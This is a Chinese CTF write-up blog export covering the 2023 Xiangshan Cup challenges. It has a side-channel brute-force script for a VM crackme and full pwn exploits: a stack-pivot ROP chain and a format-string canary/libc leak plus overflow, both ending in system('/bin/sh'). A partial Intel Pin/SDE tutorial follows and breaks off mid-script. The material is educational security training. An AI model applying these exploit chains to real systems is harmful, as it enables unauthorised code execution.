id="nesting"><a href="#nesting" class="headerlink" title="nesting"></a>nesting</h2><p>虚拟机逆向</p><p>vm题的一些思路</p><p>1.还原结构体和switch跳表，读懂vm代码，写代码将opcode转化成汇编指令语句然后再逆向汇编代码，这种方法效率最低，做一题需要很久，像这次比赛两个小时肯定不够，除非做到过类似的。</p><p>2.软件分析工具和脚本。</p><p>3.爆破。主要用于程序对flag(input)的检测是逐位的情况下，每一位的对错都会导致执行流的改变，执行时间或执行指令数量相差巨大，这样就能进行侧信道逐位爆破。战队里大佬用侧信道的方式爆破出来了，学习一下。</p><p>首先来逆向代码</p><p><img src="/2023/10/18/2023%E9%A6%99%E5%B1%B1%E6%9D%AFwp/QQ%E6%88%AA%E5%9B%BE20231019214727.png"></p><p><img src="/2023/10/18/2023%E9%A6%99%E5%B1%B1%E6%9D%AFwp/QQ%E6%88%AA%E5%9B%BE20231019214759.png"></p><p>run_vm中的代码比较混乱，主要原因是将a1识别成了数组，并将swtich语句识别成了if-else语句，需要创建结构体对a1进行重定义并恢复switch跳表</p><p>tips:ida7.7及以上可以识别出switch语句，不需要手动恢复</p><p><a href="https://blog.csdn.net/hgy413/article/details/7104304">ida创建结构体参考</a>       <a href="https://blog.csdn.net/huzai9527/article/details/121204850">ida修复switch跳表参考</a></p><p>跳表修复时Default jump address不设定好的话，会出现多余的case</p><p>结构体创建完后将run_vm函数的指向opcode的参数定义成刚刚创建的结构体(选中,右键, Convert to struct)</p><p>修复前</p><img src="/2023/10/18/2023%E9%A6%99%E5%B1%B1%E6%9D%AFwp/QQ截图20231019222157.png" alt style="zoom:50%;"><p>修复后</p><p><img src="/2023/10/18/2023%E9%A6%99%E5%B1%B1%E6%9D%AFwp/QQ%E6%88%AA%E5%9B%BE20231019223303-1697726007256.png"></p><p>现在代码就比较美观了，但是虚拟机的逻辑还是很复杂,所以不逆了</p><p>程序运行后会让你输入flag并检测flag是否正确</p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs css"><span class="hljs-selector-tag">Input</span> your flag:<br></code></pre></td></tr></table></figure><p>这里用sde来统计程序运行到的指令数量，结果会在命令行以ICOUNT: 3421916的形式输出，这也方便爆破脚本的编写</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">sde -icount -- ./nesting<br></code></pre></td></tr></table></figure><p>可以发现每多输入一位，总指令数都会增加20万左右</p><p>flag的前4位必定是”flag”，分别输入”1111”,”f111”，”fl11”，”fla1”，”flag”可以发现在位数相同的情况下，flag每正确一位总指令数会增加55000左右，说明flag是逐位check的，并且不同结果的执行流长度相差较大，可以通过这一点来爆破flag</p><p>爆破脚本</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span>*<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">run</span>(<span class="hljs-params"><span class="hljs-built_in">str</span></span>):<br>p = process([<span class="hljs-string">&#x27;sde64&#x27;</span>,<span class="hljs-string">&#x27;-icount&#x27;</span>,<span class="hljs-string">&#x27;--&#x27;</span>,<span class="hljs-string">&#x27;./nesting&#x27;</span>])<br>p.recvuntil(<span class="hljs-string">&#x27;Input your flag:&#x27;</span>)<br>p.sendline(<span class="hljs-built_in">str</span>)<br>p.recvuntil(<span class="hljs-string">&#x27;ICOUNT:&#x27;</span>)<br>icount = <span class="hljs-built_in">int</span>(p.recvline())<br>p.close()<br><span class="hljs-keyword">return</span> icount<br><br>table = <span class="hljs-string">&#x27;0123456789abcdef-&#125;&#x27;</span><br><span class="hljs-comment">#table = string.printable</span><br>flag = <span class="hljs-string">&#x27;flag&#123;&#x27;</span><br><br><span class="hljs-keyword">while</span> <span class="hljs-literal">True</span>:<br>t1 = run(flag+<span class="hljs-string">&#x27;#&#x27;</span>)<br>ok = <span class="hljs-number">0</span><br><span class="hljs-keyword">for</span> ch <span class="hljs-keyword">in</span> table:<br>t2 = run(flag+ch)<br><span class="hljs-keyword">if</span>(t2-t1&gt;<span class="hljs-number">50000</span>):<br>flag = flag + ch<br>ok = <span class="hljs-number">1</span><br><span class="hljs-built_in">print</span>(flag)<br><span class="hljs-keyword">break</span><br><span class="hljs-keyword">if</span>(ok==<span class="hljs-number">0</span>):<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;result : &#x27;</span>+flag)<br>exit()<br><span class="hljs-comment">#flag&#123;2c7c093b-f648-11ed-a716-701ab8caaafe&#125;</span><br></code></pre></td></tr></table></figure><h1 id="PWN"><a href="#PWN" class="headerlink" title="PWN"></a>PWN</h1><h2 id="move"><a href="#move" class="headerlink" title="move"></a>move</h2><p>main函数</p><p><img src="/2023/10/18/2023%E9%A6%99%E5%B1%B1%E6%9D%AFwp/QQ%E6%88%AA%E5%9B%BE20231029232915.png"></p><p>vuln函数</p><p><img src="/2023/10/18/2023%E9%A6%99%E5%B1%B1%E6%9D%AFwp/QQ%E6%88%AA%E5%9B%BE20231029232947.png"></p><p>先读取0x20的数据到bss段，再读取4字节数据，等于0x12345678的话vuln函数中可以栈溢出0x10字节，可以覆盖rbp和返回地址</p><p>思路是栈迁移到bss段，跳转到vuln中的read函数，向bss中的rbp-0x30处读入0x40的数据,不断重复构造。</p><p>注意第二次和第三次执行vuln中的read函数时ROP是在read函数中进行的，read函数本身没有push rbp和leave，只有ret，利用read中的ret返回到bss中的p64(rbp_ret) + p64(bss_addr-0x30-8) + p64(leave_ret)来反复在bss段进行ROP。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span>* <br><span class="hljs-keyword">from</span> LibcSearcher <span class="hljs-keyword">import</span>*<br>context(log_level=<span class="hljs-string">&#x27;debug&#x27;</span>,os=<span class="hljs-string">&quot;linux&quot;</span>, arch=<span class="hljs-string">&quot;amd64&quot;</span>)<br><br>elf = ELF(<span class="hljs-string">&#x27;./pwn&#x27;</span>)<br><br>io = process(<span class="hljs-string">&#x27;./pwn&#x27;</span>)<br><br><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">debug</span>():<br>    gdb.attach(io,<span class="hljs-string">&#x27;b main&#x27;</span>)<br>    sleep(<span class="hljs-number">1</span>)<br>rbp_ret = <span class="hljs-number">0x401262</span><br>  <br>rdi_ret = <span class="hljs-number">0x401353</span><br><br>puts_got = <span class="hljs-number">0x404018</span><br><br>puts_plt = <span class="hljs-number">0x401080</span><br><br>bss_addr = <span class="hljs-number">0x4050A0</span><br><br>leave_ret = <span class="hljs-number">0x4012E0</span><br><br>vuln_read = <span class="hljs-number">0x401230</span> <br><br>io.recvuntil(<span class="hljs-string">&#x27;lets travel again!&#x27;</span>)<br>bss1 = p64(bss_addr) + p64(vuln_read)<br>io.send(bss1)<br><br>io.recvuntil(<span class="hljs-string">&#x27;Input your setp number&#x27;</span>)<br>io.send(<span class="hljs-string">b&#x27;\x78\x56\x34\x12&#x27;</span>)<br><br><span class="hljs-comment">#debug()</span><br><br>io.recvuntil(<span class="hljs-string">&#x27;TaiCooLa&#x27;</span>)<br>payload1 = <span class="hljs-string">b&#x27;a&#x27;</span>*<span class="hljs-number">0x30</span> + p64(bss_addr) + p64(leave_ret)<br>io.send(payload1)<br><br>sleep(<span class="hljs-number">0.5</span>)<br>bss2 = p64(rdi_ret) + p64(puts_got) + p64(puts_plt) + p64(rbp_ret) + p64(bss_addr) + p64(vuln_read) + p64(bss_addr-<span class="hljs-number">0x30</span>-<span class="hljs-number">8</span>) + p64(leave_ret)<br>io.send(bss2)<br><br>puts_addr = u64(io.recv(<span class="hljs-number">6</span>).ljust(<span class="hljs-number">8</span>,<span class="hljs-string">b&#x27;\x00&#x27;</span>))<br><br>success(<span class="hljs-string">&#x27;puts_addr = &#x27;</span> + <span class="hljs-built_in">hex</span>(puts_addr))<br><br>libc = LibcSearcher(<span class="hljs-string">&#x27;puts&#x27;</span>,puts_addr)<br><br>libc_base = puts_addr - libc.dump(<span class="hljs-string">&#x27;puts&#x27;</span>)<br><br>success(<span class="hljs-string">&#x27;libc_base = &#x27;</span> + <span class="hljs-built_in">hex</span>(libc_base))<br><br>system_addr = libc_base + libc.dump(<span class="hljs-string">&#x27;system&#x27;</span>)<br><br>binsh = libc_base + libc.dump(<span class="hljs-string">&#x27;str_bin_sh&#x27;</span>)<br><br>sleep(<span class="hljs-number">0.5</span>)<br>payload2 = p64(rdi_ret) + p64(binsh) + p64(system_addr) +  p64(<span class="hljs-number">0</span>) + p64(<span class="hljs-number">0</span>) + p64(rbp_ret) + p64(bss_addr-<span class="hljs-number">0x30</span>-<span class="hljs-number">8</span>) + p64(leave_ret)<br>io.send(payload2)<br><br>io.interactive()<br></code></pre></td></tr></table></figure><h2 id="pwthon"><a href="#pwthon" class="headerlink" title="pwthon"></a>pwthon</h2><p>本地运行条件：</p><ul><li><p>python3.7并安装numpy库，<a href="https://blog.csdn.net/qq_51116518/article/details/130184514">Ubuntu 下载并切换Python默认版本（无痛顺畅版）</a></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_">#</span><span class="language-bash">查看并切换python版本</span><br>sudo update-alternatives --config python<br></code></pre></td></tr></table></figure></li><li><p>创建.&#x2F;tmp文件夹</p></li><li><p>在import app前添加</p></li></ul><figure class="highlight stata"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs stata">sys.path.<span class="hljs-keyword">append</span>(&#x27;path_to/<span class="hljs-keyword">app</span>.cpython-37m-x86_64-linux-gnu.<span class="hljs-keyword">so</span>&#x27;)<br></code></pre></td></tr></table></figure><p>查看保护</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_">$ </span><span class="language-bash">checksec app.cpython-37m-x86_64-linux-gnu.so</span>  <br>  Arch:     amd64-64-little<br>    RELRO:    Partial RELRO<br>    Stack:    Canary found<br>    NX:       NX enabled<br>    PIE:      PIE enabled<br>    RPATH:    &#x27;/home/xiran/anaconda3/envs/cython/lib&#x27;<br></code></pre></td></tr></table></figure><p>打开ida，通过查看字符串交叉引用找到Welcome2Pwnthon函数</p><p>发现泄露了app_so库中__pyx_f_3app_get_info函数的地址，第一次read后有格式化字符串漏洞，第二次read存在栈溢出。</p><p><img src="/2023/10/18/2023%E9%A6%99%E5%B1%B1%E6%9D%AFwp/QQ%E6%88%AA%E5%9B%BE20231031125959.png"></p><p>用gdb调试，在栈上找到了open64函数，并且在canary之前，那么一次格式化字符串可以泄露libc+canary</p><p>exp，ubuntu2004本机打通了，其它环境可能open64和canary的偏移要修改</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span>*<br><span class="hljs-keyword">from</span> LibcSearcher <span class="hljs-keyword">import</span>*<br>context(log_level=<span class="hljs-string">&#x27;debug&#x27;</span>,arch=<span class="hljs-string">&#x27;amd64&#x27;</span>)<br><br>io = process([<span class="hljs-string">&#x27;python3.7&#x27;</span>,<span class="hljs-string">&#x27;main.py&#x27;</span>])<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">debug</span>():<br>gdb.attach(io,<span class="hljs-string">&#x27;b _pyx_f_3app_Welcome2Pwnthon&#x27;</span>)<br>sleep(<span class="hljs-number">1</span>)<br>io.sendline(<span class="hljs-string">&#x27;0&#x27;</span>)<br>io.recvuntil(<span class="hljs-string">&#x27;Give you a gift &#x27;</span>)<br>app_info = <span class="hljs-built_in">int</span>(io.recv(),<span class="hljs-number">16</span>)<br>success(<span class="hljs-string">&#x27;app_info = &#x27;</span> + <span class="hljs-built_in">hex</span>(app_info))<br>app_base = app_info - <span class="hljs-number">0x68b0</span><br>success(<span class="hljs-string">&#x27;app_base = &#x27;</span> + <span class="hljs-built_in">hex</span>(app_base))<br><br><span class="hljs-comment">#debug()</span><br>io.sendline(<span class="hljs-string">&#x27;%p-&#x27;</span>*<span class="hljs-number">35</span>)<br>datas = io.readline().decode().split(<span class="hljs-string">&quot;-&quot;</span>)<br>open64_addr = <span class="hljs-built_in">int</span>(datas[<span class="hljs-number">23</span>],<span class="hljs-number">16</span>)-<span class="hljs-number">232</span><br>canary = <span class="hljs-built_in">int</span>(datas[<span class="hljs-number">29</span>],<span class="hljs-number">16</span>)<br><br>libc = LibcSearcher(<span class="hljs-string">&#x27;open64&#x27;</span>,open64_addr)<br>libc_base = open64_addr - libc.dump(<span class="hljs-string">&#x27;open64&#x27;</span>)<br>success(<span class="hljs-string">&#x27;libc_base = &#x27;</span> + <span class="hljs-built_in">hex</span>(libc_base))<br>system_addr = libc_base + libc.dump(<span class="hljs-string">&#x27;system&#x27;</span>)<br>binsh_addr = libc_base + libc.dump(<span class="hljs-string">&#x27;str_bin_sh&#x27;</span>)<br>rdi_ret = app_base + <span class="hljs-number">0x3f8f</span><br>ret = app_base + <span class="hljs-number">0x301a</span><br><br>payload = <span class="hljs-string">b&#x27;a&#x27;</span>*<span class="hljs-number">0x108</span> + p64(canary) + p64(<span class="hljs-number">0</span>) + p64(ret) + p64(rdi_ret) + p64(binsh_addr) + p64(system_addr)<br>io.sendline(payload)<br><br>io.interactive()<br></code></pre></td></tr></table></figure><h2 id="reference"><a href="#reference" class="headerlink" title="reference"></a>reference</h2><p><a href="https://blog.xmcve.com/2023/10/16/%E9%A6%99%E5%B1%B1%E6%9D%AF2023-Writeup/">星盟2023香山杯2023香山杯wp</a></p><p>ArrestYou香山杯2023香山杯wp，公众号山海之关</p>]]></content>
    
    
    <categories>
      
      <category>writeup</category>
      
    </categories>
    
    
    <tags>
      
      <tag>writeup</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>动态二进制插桩工具Pin和pintools</title>
    <link href="/2023/10/13/%E5%8A%A8%E6%80%81%E4%BA%8C%E8%BF%9B%E5%88%B6%E6%8F%92%E6%A1%A9pin%E5%92%8Cpintools/"/>
    <url>/2023/10/13/%E5%8A%A8%E6%80%81%E4%BA%8C%E8%BF%9B%E5%88%B6%E6%8F%92%E6%A1%A9pin%E5%92%8Cpintools/</url>
    
    <content type="html"><![CDATA[<h2 id="Pin简介"><a href="#Pin简介" class="headerlink" title="Pin简介"></a>Pin简介</h2><p><a href="https://www.intel.cn/content/www/cn/zh/developer/articles/tool/pin-a-dynamic-binary-instrumentation-tool.html">Intel官方文档 Pin</a>，概述，下载，手册等都有</p><p>Pin是intel开发的一个<strong>动态二进制插桩</strong>工具，提供了丰富的API，支持windows、linux、macos，适用于 IA-32、x86-64 和 MIC 指令集架构。</p><p>动态二进制插桩（Dynamic Binary Instrumentation，DBI）的含义：不需要源代码，可以在二进制可执行文件文件的任意位置插入任意的代码 (C&#x2F;C++ 编写)，可以将代码动态地添加到正在执行地可执行文件中。目前的DBI平台有Pin、DynamoRIO、Valgrind等。</p><p>基于Pin提供的API开发(c,c++,asm)的工具为pintools。Pin最初是计算机体系结构分析工具，但其灵活的API和活跃的社区（称为“ <a href="https://groups.io/g/pinheads">Pinheads</a> ”）创建了一组用于安全、仿真和并行程序分析的多样化工具。</p><p>Pin的功能：可以用自己的函数替换程序中的函数，并且在自己的函数中调用被替换的函数；可以在指令中插入对检测函数的调用，使得在执行指令时执行检测函数，同时可以给检测函数传递参数(寄存器值、指令读写的内存地址、寄存器上下文)；可以随时attach和detach进程，即可以自定义在程序中需要插桩和检测的部分；可以追踪函数调用以及syscall，检测&#x2F;改变参数；可以配合调试器（如gdb）使用，实现调试器的一些拓展功能；跟踪应用程序子线程；拦截signal信号；检测进程树等。</p><h2 id="Pintool使用"><a href="#Pintool使用" class="headerlink" title="Pintool使用"></a>Pintool使用</h2><p>先看readme，介绍了pintools的编译和基本使用</p><p>readme演示的是opcodemix，它可以用来分析程序包含的不同指令组合的数目，比如可以比较两款编译器编译生成的文件的指令组合的差异</p><figure class="highlight gradle"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs gradle"><span class="hljs-keyword">This</span> example applies to a <span class="hljs-number">64</span>-bit application. <span class="hljs-keyword">For</span> a <span class="hljs-number">32</span>-bit application please use <span class="hljs-string">&quot;obj-ia32&quot;</span><br>instead of <span class="hljs-string">&quot;obj-intel64&quot;</span> and add <span class="hljs-string">&quot;TARGET=ia32&quot;</span> to the make command.<br><br>To build and run a sample tool on Linux*:<br><br>    cd <span class="hljs-keyword">source</span><span class="hljs-regexp">/tools/</span>SimpleExamples<br>    make obj-intel64/opcodemix.so<br>    ..<span class="hljs-regexp">/../</span>..<span class="hljs-regexp">/pin -t obj-intel64/</span>opcodemix.so -- <span class="hljs-regexp">/bin/</span>ls<br><br>    <span class="hljs-keyword">This</span> will instrument and run <span class="hljs-regexp">/bin/</span>ls, the output <span class="hljs-keyword">for</span> <span class="hljs-keyword">this</span> tool is in<br>    opcodemix.out.<br></code></pre></td></tr></table></figure><p><a href="https://www.intel.cn/content/www/cn/zh/developer/articles/tool/pin-a-binary-instrumentation-tool-downloads.html">下载Pin</a></p><p>编译ManualExamples下的所有Pintool(64位)，编译生成的文件会放在obj-intel64目录中</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_">$ </span><span class="language-bash"><span class="hljs-built_in">cd</span> <span class="hljs-built_in">source</span>/tools/ManualExamples</span><br><span class="hljs-meta prompt_">$ </span><span class="language-bash">make all TARGET=intel64</span><br></code></pre></td></tr></table></figure><p>使用编译好的工具，我们需要.so文件-t指明要使用的pintool，–后面是要插桩运行的程序</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">..<span class="hljs-regexp">/../</span>..<span class="hljs-regexp">/pin -t obj-intel64/i</span>nscount0.so -- <span class="hljs-regexp">/bin/</span>ls<br></code></pre></td></tr></table></figure><p>这里使用的是inscount0,可以统计运行的指令数量，结果保存在运行时所在目录下的inscount.out文件，inscount0、incount1、inscount2的区别在于后者对运行效率进行了优化。</p><h2 id="Pintool架构"><a href="#Pintool架构" class="headerlink" title="Pintool架构"></a>Pintool架构</h2><p>windows和linux下Pin的大致架构都是如下</p><ul><li>供 pintool 调用的API库。Linux下是instrumentation api 库，windows中是PIN.LIB；</li><li>VM：即 virtual machine，它的功能主要是插桩并执行程序，过程类似于即时编译，只是编译变成了插桩。大致流程是：先对部分代码进行插桩，放到code cache中运行，运行时需要跳转到未插桩的代码时再对相应代码进行插桩并放入code cache。linux中包含了 emulation unit 用来处理系统调用，JIT 编译器负责编译和插桩，每次取一个 trace 编译后送到 code cache 中；windows原理相同，主要功能集中在PINVM.DLL，执行过程大概是启动pin.exe以debugger的模式，附加要分析程序的进程 -&gt; 注入pinvm.dll-&gt;注入pintool的dll-&gt;开始运行。</li><li>code cache：用来存储插桩后的代码，真正执行的是 code cache 中的代码，原目标插桩文件中的代码不会执行。</li></ul><p>linux下的架构</p><p><a href="https://blog.csdn.net/T2777/article/details/121282703#Pin%20%E6%80%BB%E7%BB%93%F0%9F%93%98">来源</a></p><p><img src="/2023/10/13/%E5%8A%A8%E6%80%81%E4%BA%8C%E8%BF%9B%E5%88%B6%E6%8F%92%E6%A1%A9pin%E5%92%8Cpintools/1.png" alt="1"></p><p>windows下的架构</p><p><a href="https://www.intel.cn/content/dam/develop/external/us/en/documents/cgo2013-256675.pdf">来源</a></p><p><img src="/2023/10/13/%E5%8A%A8%E6%80%81%E4%BA%8C%E8%BF%9B%E5%88%B6%E6%8F%92%E6%A1%A9pin%E5%92%8Cpintools/2.png" alt="2"></p><h2 id="编写自己的Pintools"><a href="#编写自己的Pintools" class="headerlink" title="编写自己的Pintools"></a>编写自己的Pintools</h2><p>阅读不同版本Pin对应的用户手册，其中有详细的API及示例，如<a href="https://software.intel.com/sites/landingpage/pintool/docs/98749/Pin/doc/html/index.html">Pin 3.28 User Guide</a></p><p>[<a href="https://www.v4ler1an.com/">V4ler1an的博客</a>]，主要是官方文档的相关内容的整理总结，博主是看雪二进制漏洞板块小版主。</p><h2 id="intel-sde"><a href="#intel-sde" class="headerlink" title="intel sde"></a>intel sde</h2><p><a href="https://www.intel.cn/content/www/cn/zh/developer/articles/tool/software-development-emulator.html?_x_tr_sl=auto&_x_tr_tl=zh-CN&_x_tr_hl=zh-CN">官方下载及文档</a></p><p>sde基于pin和xed，sde在pin插桩分析的基础上多了仿真的功能，可以在特定指令集架构上运行给定程序并捕获各种性能详细信息，可以供开发人员提前熟悉和探索即将推出的新指令集，为在软件中使用新指令集做准备。</p><p>Intel X86 Encoder Decoder (XED) 是一个软件库，用于编码和解码 X86（IA32 和 Intel64）指令。解码器采用 1-15 字节的序列以及机器模式信息，并生成描述操作码、操作数和标志的数据结构。编码器采用类似的数据结构并生成 1 到 15 个字节的序列。反汇编本质上是对数据结构的打印。</p><p>即XED可以对x86&#x2F;64代码进行反汇编以及将汇编转化为机器码,可执行程序xed可以反汇编PE和ELF可执行文件。</p><p><strong>sde基本使用</strong></p><p>中括号表示可选参数</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">path-to-kit/sde [sde args] -- user-application [app args]<br></code></pre></td></tr></table></figure><p>用sde运行cmd或shell可以使所有在cmd&#x2F;shell中运行的程序都在sde的控制之下，sde可以收集并分析所有该命令行中的内容。</p><p>例如：</p><figure class="highlight arcade"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs arcade">sde -icount -- <span class="hljs-regexp">/bin/</span>sh<br></code></pre></td></tr></table></figure><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_">#</span><span class="language-bash">查看帮助</span><br>-help   <br><span class="hljs-meta prompt_">#</span><span class="language-bash">查看更多更详细的帮助，可查看支持仿真的cpu和指令集以及其对应的命令行参数<span class="hljs-built_in">id</span>，可查看分析工具更详细的参数</span><br>-help-long<br><span class="hljs-meta prompt_">#</span><span class="language-bash">查看运行到的不同函数中不同指令的数量统计，输出在文件中</span><br>-mix<br><span class="hljs-meta prompt_">#</span><span class="language-bash">统计运行的指令数量，有终端输出和文件输出</span><br>-icount<br><span class="hljs-meta prompt_">#</span><span class="language-bash">更多功能及参数请看文档</span><br></code></pre></td></tr></table></figure><h2 id="Pin-in-CTF"><a href="#Pin-in-CTF" class="headerlink" title="Pin in CTF"></a>Pin in CTF</h2><p>因为Pin能够直接对可执行程序动态插桩进行信息收集，所以求解部分ctf题有奇效。</p><p>主要用于程序复杂（如复杂的vm逆向以及混淆题）但是对flag(input)的检测是逐位的情况下，每一位的对错都会导致执行流的改变，执行时间或执行指令数量相差巨大，这样就能进行侧信道逐位爆破。</p><p><a href="https://ctf-wiki.github.io/ctf-tools/binary-core-tools/instrumentation/intel_pin/">[ctf-wiki]intel pin</a>上有两道例题</p><h5 id="2023香山杯nesting"><a href="#2023香山杯nesting" class="headerlink" title="2023香山杯nesting"></a>2023香山杯nesting</h5><p>一道vm题，但这里可以不用ida分析</p><p>程序运行后会让你输入flag并检测flag是否正确</p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs css"><span class="hljs-selector-tag">Input</span> your flag:<br></code></pre></td></tr></table></figure><p>用sde来统计程序运行到的指令数量，结果会在命令行以ICOUNT: 3421916的形式输出，这也方便爆破脚本的编写</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">sde -icount -- ./nesting<br></code></pre></td></tr></table></figure><p>可以发现每多输入一位，总指令数都会增加20万左右</p><p>flag的前4位必定是”flag”，分别输入”1111”,”f111”，”fl11”，”fla1”，”flag”可以发现在位数相同的情况下，flag每正确一位总指令数会增加55000左右，说明flag是逐位check的，并且不同结果的执行流长度相差较大，可以通过这一点来爆破flag</p><p>爆破脚本，来自Re神</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span>*<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">run</span>(<span class="hljs-params"><span class="hljs-built_in">str</span></span>):<br>p = process([<span class="hljs-string">&#x27;sde64&#x27;</span>,<span class="hljs-string">&#x27;-icount&#x27;</span>,<span class="hljs-string">&#x27;--&#x27;</span>,<span class="hljs-string">&#x27;./nesting&#x27;</span>])<br>p.recvuntil(<span class="hljs-string">&#x27;Input your flag:&#x27;</span>)<br>p.sendline(<span class="hljs-built_in">str</span>)<br>p.recvuntil(<span class="hljs-string">&#x27;ICOUNT:&#x27;</span>)<br>icount = <span class="hljs-built_in">int</span>(p.recvline())<br>p.close()<br><span class="hljs-keyword">return</span> icount<br><br>table = <span class="hljs-string">&#x27;0123456789abcdef-&#125;&#x27;</span><br><span class="hljs-comment">#table = string.printable</span><br>flag = <span class="hljs-string">&#x27;flag&#123;&#x27;</span><br><br><span class="hljs-keyword">while</span> <span class="hljs-literal">True</span>:<br>t1 = run(flag+<span class="hljs-string">&#x27;#&#x27;</span>)<br>ok = <span class="hljs-number">0</span><br><span class="hljs-keyword">for</span> ch <span class="hljs-keyword">in</span> table:<br>t2 = run(flag+ch)<br><span class="hljs-keyword">if</span>(t2-t1&gt;<span class="hljs-number">50000</span>):<br>flag = flag + ch<br>ok = <span 